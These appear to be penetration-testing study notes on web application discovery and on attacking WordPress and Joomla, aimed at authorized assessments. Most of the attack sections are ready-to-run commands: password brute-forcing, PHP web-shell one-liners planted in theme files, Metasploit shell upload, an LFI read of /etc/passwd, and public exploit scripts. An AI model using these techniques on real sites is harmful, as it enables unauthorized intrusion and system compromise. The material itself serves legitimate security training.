---
layout: default
title: Common Application Attacks
permalink: /Web/App/
---

# Application Discovery & Enumeration

[EyeWitness](https://github.com/RedSiege/EyeWitness) and [Aquatone](https://github.com/michenriksen/aquatone) are tools to help us quickly inspect all hosts running web applications and take screenshots using raw Nmap XML scan outputs as input.

## Note Taking

We should use a note taking app. 
Some tips:
- Break down the `Enumeration & Discovery` section of the notebook into a separate `Application Discovery` section.
- In the `Application Discovery` we can create subsections for the scope, scans, app screenshotting, interesting hosts, etc.
- Time and date stamp every scan and save all output and the executed scan command.

Example note structure:
```
External Penetration Test - <Client Name>

- Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- Client Points of Contact
- Credentials
- Discovery/Enumeration
  o Scans
  o Live hosts
- Application Discovery
- Scans
- Interesting/Notable Hosts
- Exploitation
  o <Hostname or IP>
  o <Hostname or IP>
- Post-Exploitation
  o <Hostname or IP>
  o <Hostname or IP>
```

At the very least, our report should have an appendix section that lists the following information—more on this in a later module:
- Exploited systems (hostname/IP and method of exploitation)
- Compromised users (account name, method of compromise, account type (local or domain))
- Artifacts created on systems
- Changes (such as adding a local admin user or modifying group membership)

## Initial Enumeration

1. We can start with an Nmap scan of common web ports. I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan.
2. While reviewing the screenshot report of the most common ports, we can run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage.
3. We should not rely solely on scanners. We often find the most unique and severe vulnerabilities and misconfigurations only through thorough manual testing.

*Note: We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report.*

Let's say the scope_list something like:
```
app.company.local
dev.company.local
drupal-dev.conpany.local
...
```
The initial scan:
```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
Enumerating one of the hosts further:
```
sudo nmap --open -sV 10.129.201.50
```

## EyeWitness
Install:
```
sudo apt install eyewitness
```
Available options:
```
eyewitness -h
```
Take screenshots using Nmap XML output:
```
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

## Aquatone
Install:
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```
```
unzip aquatone_linux_amd64_1.7.0.zip
```
We can move it to a location in our $PATH such as /usr/local/bin to be able to call the tool from anywhere.

Run:
```
cat web_discovery.xml | ./aquatone -nmap
```
We can open the html report from a browser: `file:///<path_to_report.html>`.

# WordPress

## Discovery & Enumeration

- Browse to the `/robots.txt` file.
- WordPress stores its plugins in the `wp-content/plugins` directory, and themes in the `wp-content/themes` directory. These should be enumerated as they may lead to RCE.

Types of users on a standard WordPress installation:
- Administrator
- Editor
- Author
- Contributor
- Subscriber

Useful commands:
```
curl -s http://blog.company.local | grep WordPress
```
```
curl -s http://blog.company.local/ | grep themes
```
```
curl -s http://blog.company.local/ | grep plugins
```

- After identifying themes and plugins, the next step is to enumerate versions.
  E.g. if `mail-masta` plugin is installed, visit the specific site, such as `http://blog.company.local/wp-content/plugins/mail-masta/`.
- Checking the page source of a page can reveal other used plugins.
  ```
  curl -s http://blog.company.local/?p=1 | grep plugins
  ```

*Note: It is important at this stage to not jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don't want to miss.*

## Enumerating Users

The default WordPress login page can be found at /wp-login.php.
- A valid username and an invalid password may result in different message than an invalid username. This can bes used for username enumeration.

## WPScan
```
sudo gem install wpscan
```
WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpscan.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.
```
wpscan -h
```
```
sudo wpscan --url http://blog.company.local --enumerate --api-token dEOFB<SNIP>
```
## Attacking WordPress
### Login Bruteforce
```
sudo wpscan --password-attack xmlrpc -t 20 -U ./usernames.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.company.local
```
`xmlrpc` method is preferred over `wp-login` as it's faster.

### Code Execution
If we gained admin credentials, we can try to edit a theme on the admin panel (Appearance > Theme Editor) by adding the `system($_GET[0]);` one-liner to an uncommon page, such as `404.php`. Then we can execute commands via the GET parameter `0`. WordPress themes are located at `/wp-content/themes/<theme name>`.
```
curl http://blog.company.local/wp-content/themes/twentynineteen/404.php?0=id
```
#### Metasploit
The `wp_admin_shell_upload` module from Metasploit can be used to upload a shell and execute it automatically:
```
msfconsole
```
```
use exploit/unix/webapp/wp_admin_shell_upload
```
To ensure that everything is set up properly:
```
show options
```
To set a value:
```
set RHOST <IP>
```
Once the setup is correct:
```
exploit
```
In this example, the Metasploit module uploaded the `wCoUuUPfIO.php` file to the `/wp-content/plugins directory`. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. 

### Leveraging Known Vulnerabilities
The vast majority of the vulnerabilities can be found in plugins.
*Note: We can use the waybackurls tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.*

#### mail-pasta plugin
LFI:
```
curl -s http://blog.company.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
#### wpDiscuz plugin
Using [this exploit](https://www.exploit-db.com/exploits/49967):
```
python3 wp_discuz.py -u http://blog.company.local -p /?p=1
```
The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append `?cmd=` after the generated php webshell to run commands which we can see in the exploit script:
```
curl -s http://blog.company.local/wp-content/uploads/2021/08/zeeaygvkeodlgvt-1762181484.7355.php?cmd=id
```

# Joomla

## Discovery

```
curl -s http://dev.company.local/ | grep Joomla
```

Check the robots.txt file.

```
curl -s http://dev.company.local/README.txt | head -n 5
```

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.

```
curl -s http://dev.company.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml.

## Enumeration
We cab try out [droopescan](https://github.com/SamJoan/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```
sudo pip3 install droopescan
```
```
droopescan -h
```
run a scan:
```
droopescan scan joomla --url http://dev.company.local/
```
We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. 
Installation of Python2.7:
```
curl https://pyenv.run | bash
```
Or if that version is already installed, we can directly use the `pyenv shell 2.7` command to use python2.7.
Then:
```
python2.7 -m pip install urllib3
```
Running a scan:
```
python2.7 joomlascan.py -u http://dev.company.local
```
## Brute-frocing
We can use [this script](https://github.com/ajnik/joomla-bruteforce):
```
sudo python3 joomla-brute.py -u http://dev.company.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Attacking Joomla
If we find access to the admin panel, we can check the Templates and edit one of the pages by adding a one-liner:
```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
then we can execute code with a `curl` command:
```
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
Here we edited the `error.php` page.
*Note: It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.*

### Leveraging Known Vulnerabilities
Once we find the version, we can look for exploits in `exploit-db`.

#### Example
[CVE-2019-10945](https://www.cve.org/CVERecord?id=CVE-2019-10945) is a directory traversal and authenticated file deletion vulnerability. We can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945).

```
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```
